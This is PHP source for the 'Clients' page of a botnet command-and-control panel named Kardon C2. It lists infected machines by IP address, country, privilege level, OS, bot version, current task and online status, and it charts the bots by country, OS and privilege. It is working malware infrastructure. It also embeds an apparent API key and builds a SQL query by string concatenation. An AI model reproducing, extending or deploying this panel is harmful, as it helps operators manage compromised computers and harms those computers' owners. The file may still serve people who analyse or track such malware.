<?php
    include '../inc/session.php';
    include '../inc/stats.php';
    include '../inc/geo.php';  
    $userperms = $odb->query("SELECT privileges FROM users WHERE username = '".$username."'")->fetchColumn(0);
?>
<html>
  <head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="description" content="A front-end template that helps you build fast, modern mobile web apps.">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Kardon C2</title>
    <meta name="mobile-web-app-capable" content="yes">
    <link rel="icon" sizes="192x192" href="../img/android-desktop.png">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black">
    <meta name="apple-mobile-web-app-title" content="Material Design Lite">
    <link rel="apple-touch-icon-precomposed" href="../img/ios-desktop.png">
    <meta name="msapplication-TileImage" content="../img/touch/ms-touch-icon-144x144-precomposed.png">
    <meta name="msapplication-TileColor" content="#3372DF">
    <link rel="shortcut icon" href="../img/favicon.png">
    <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:regular,bold,italic,thin,light,bolditalic,black,medium&amp;lang=en">
    <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
    <link rel="stylesheet" href="https://code.getmdl.io/1.3.0/material.cyan-light_blue.min.css">
    <link rel="stylesheet" href="../css/styles.css">
    <style>
    #view-source {
      position: fixed;
      display: block;
      right: 0;
      bottom: 0;
      margin-right: 40px;
      margin-bottom: 40px;
      z-index: 900;
    }
    </style>
    <script type="text/javascript" src="https://www.gstatic.com/charts/loader.js"></script>
        <script type="text/javascript">
        google.charts.load('current', {
        'packages':['geochart', 'corechart'],
        'mapsApiKey': 'AIzaSyAmjTDuWiy-V8RbMbtk1j6SbBm_hoNftBo'
        });
        google.charts.setOnLoadCallback(drawRegionsMap);
        google.charts.setOnLoadCallback(drawTopCountries);
        google.charts.setOnLoadCallback(drawTopOs);
        google.charts.setOnLoadCallback(drawTopPriv);
        function drawTopPriv()
        {
            var data = google.visualization.arrayToDataTable([
                ['privilege', 'Bots'],
                <?php
                $csel = $odb->query("SELECT privileges, COUNT(*) AS cnt FROM bots GROUP BY privileges ORDER BY cnt DESC");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart3'));
              chart.draw(data, options);
        }
        function drawTopOs()
        {
            var data = google.visualization.arrayToDataTable([
                ['Operating Sys', 'Bots'],
                <?php
                $csel = $odb->query("SELECT osversion, COUNT(*) AS cnt FROM bots GROUP BY osversion ORDER BY cnt DESC LIMIT 3");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart2'));
              chart.draw(data, options);
        }
        function drawTopCountries()
        {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt DESC LIMIT 3");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
              ]);
              var options = {};
              var chart = new google.visualization.PieChart(document.getElementById('piechart1'));
              chart.draw(data, options);
        }
        function drawRegionsMap() {
            var data = google.visualization.arrayToDataTable([
                ['Country', 'Bots'],
                <?php
                $csel = $odb->query("SELECT country, COUNT(*) AS cnt FROM bots GROUP BY country ORDER BY cnt");
                while ($c = $csel->fetch())
                {
                    echo '[\'' . $c[0] . '\',';
                    echo $c[1] . '],' . PHP_EOL;
                }
                ?>
            ]);
            var options = {};
            var chart = new google.visualization.GeoChart(document.getElementById('regions_div'));
            chart.draw(data, options);
      }
    </script>
  </head>
  <body>
    <div class="demo-layout mdl-layout mdl-js-layout mdl-layout--fixed-drawer mdl-layout--fixed-header">
      <header class="demo-header mdl-layout__header mdl-color--grey-100 mdl-color-text--grey-600">
        <div class="mdl-layout__header-row">
          <span class="mdl-layout-title">Clients</span>
          <div class="mdl-layout-spacer"></div>
          <button class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon" id="hdrbtn">
            <i class="material-icons">more_vert</i>
          </button>
          <ul class="mdl-menu mdl-js-menu mdl-js-ripple-effect mdl-menu--bottom-right" for="hdrbtn">
            <li onclick="location.href = 'account.php';" class="mdl-menu__item">Account</li>
            <li onclick="location.href = 'settings.php';"class="mdl-menu__item">Settings</li>
            <li onclick="location.href = '../inc/logout.php?logout';"class="mdl-menu__item">Logout</li>
          </ul>
        </div>
      </header>
      <div class="demo-drawer mdl-layout__drawer mdl-color--blue-grey-900 mdl-color-text--blue-grey-50">
      <header class="demo-drawer-header">
          <img src="../img/user.jpg" class="demo-avatar">
          <div class="demo-avatar-dropdown">
            <span><br /><?php echo $username; ?></span>
            <div class="mdl-layout-spacer"></div>
            <button id="accbtn" class="mdl-button mdl-js-button mdl-js-ripple-effect mdl-button--icon">
              <i class="material-icons" role="presentation">arrow_drop_down</i>
              <span class="visuallyhidden">Manage Users</span>
            </button>
            <ul class="mdl-menu mdl-menu--bottom-right mdl-js-menu mdl-js-ripple-effect" for="accbtn">
              <li onclick="location.href = 'users.php';" class="mdl-menu__item">Manage Users</li>
            </ul>
          </div>
        </header>
        <nav class="demo-navigation mdl-navigation mdl-color--blue-grey-800">
        <a class="mdl-navigation__link" href="index.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">dashboard</i>Dashboard</a>
        <a class="mdl-navigation__link" href="clients.php"> <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">computer</i>Clients</a>
          <a class="mdl-navigation__link" href="tasks.php">   <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">schedule</i>Tasks</a>
          <a class="mdl-navigation__link" href="logs.php">    <i class="mdl-color-text--blue-grey-400 material-icons" role="presentation">list</i>Logs</a>
        </nav>
      </div>
      <main class="mdl-layout__content mdl-color--grey-100">
        <div class="mdl-grid demo-content">
            
            <div class="mdl-shadow--2dp mdl-color--white mdl-cell mdl-cell--11-col">
                <center>
                    <table id="botlist" class="mdl-data-table mdl-js-data-table mdl-data-table mdl-shadow--2dp">
                        <thead>
                            <tr>
                            <th>#</th>
                            <th>IP Address</th>
                            <th>Country</th>
                            <th>Last Response</th>
                            <th>Current Task</th>
                            <th>Operating System</th>
                            <th>Privilege</th>
                            <th>Bot Version</th>
                            <th>Mark</th>
                            <th>Status</th>
                            </tr>
                        </thead>
                        <tbody>
                            <?php
                            $bots = $odb->query("SELECT * FROM bots ORDER BY lastresponce DESC");
                            $unix = $odb->query("SELECT UNIX_TIMESTAMP()")->fetchColumn(0);
                            while ($b = $bots->fetch(PDO::FETCH_ASSOC))
                            {
                                $id = $b['id'];
                                $ip = $b['ip'];
                                $cn = countryCodeToCountry($b['country']);
                                $fl = strtolower($b['country']);
                                $lrd = $b['lastresponce'];
                                $lr = date("m-d-Y, h:i A", $lrd);
                                $ct = $b['currenttask'];
                                $os = $b['osversion'];
                                $bt = $b['privileges'];
                                $bv = $b['botversion'];
                                $st = "";
                                $mk = "";
                                if (($lrd + ($knock + 120)) > $unix)
                                {
                                    $st = '<font style="color: #4CAF50;">Online</font>';
                                }else{
                                if ($lrd + $deadi < $unix)
                                {
                                    $st = '<font style="color: #F44336;">Dead</font>';
                                }else{
                                    $st = '<font style="color: #FF9800;">Offline</font>';
                                }
                                }
                                if ($b['mark'] == "1")
                                {
                                    $mk = '<font style="color: #4CAF50;">Clean</font>';
                                    }else{
                                    $mk = '<font style="color: #F44336;">Dirty</font>';
                                }
                                echo '<tr>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$id.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric"><a id="details" data-toggle="tooltip" title="View All Details" href="details.php?id='.$id.'">'.$ip.'</a></td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$cn.'&nbsp;&nbsp;<img src="../img/flags/'.$fl.'.png" /></td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric" data-order="'.$lrd.'">'.$lr.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">#'.$ct.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$os.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">'.$bt.'</td>';
                                echo '  <td>'.$bv.'</td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric"><center>'.$mk.'</center></td>';
                                echo '  <td class="mdl-data-table__cell--non-numeric">';
                                echo '    <center class="mdl-data-table__cell--non-numeric">'.$st.'</center>';
                                echo '  </td>';
                                echo '</tr>';
                            }
                            ?>
                        </tbody>
                    </table>
                </center>
            </div>

        </div>
      </main>
    </div>
    <script src="https://code.getmdl.io/1.3.0/material.min.js"></script>
  </body>
</html>
